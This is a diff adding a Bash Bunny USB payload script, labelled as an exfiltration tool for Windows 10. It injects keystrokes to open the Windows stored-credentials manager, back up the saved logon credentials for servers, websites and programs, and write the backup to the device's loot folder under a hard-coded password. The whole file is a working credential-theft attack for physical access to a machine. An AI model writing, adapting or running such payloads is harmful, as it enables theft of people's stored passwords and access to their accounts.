@@ -1,0 +1,66 @@
+#!/bin/bash
+# Title:        KeyManager Backup
+# Description:  Create a backup of the key manager which stores log-on credentials for servers, websites and programs
+# Author:       Cribbit
+# Version:      1.0
+# Category:     Exfiltration
+# Target on:    Windows 10
+# Attackmodes:  HID & STORAGE 
+# Extensions:   Run
+# Props:        Paranoid Ninja
+
+####################### Config #######################
+password=lamepassword
+##################### End Config #####################
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+
+QUACK DELAY 200
+RUN WIN "rundll32 keymgr.dll, KRShowKeyMgr"
+QUACK DELAY 200
+# button: Backup up...
+QUACK ALT b
+QUACK DELAY 200
+# button: Browse...
+QUACK ALT b
+# file name
+QUACK STRING "backup"
+# select task bar
+QUACK ALT d
+QUACK DELAY 200
+# look for bunny
+QUACK STRING "BashBunny"
+QUACK DELAY 600
+#select drive
+QUACK DOWNARROW
+# add loot folder
+QUACK STRING "/loot"
+QUACK ENTER
+QUACK DELAY 200
+# button: Save
+QUACK ALT s
+QUACK DELAY 200
+# button: Next
+QUACK ALT n
+QUACK DELAY 200
+# note: keycroc you can uses CTRL-ALT-DELETE
+QUACK CTRL-ALT DELETE
+QUACK DELAY 200
+QUACK STRING "$password"
+QUACK TAB
+QUACK STRING "$password"
+# button: Next
+QUACK ALT n
+QUACK DELAY 300
+# button: Finish
+QUACK ALT f
+QUACK DELAY 200
+# button: Close
+QUACK ALT c
+
+LED FINISH
+
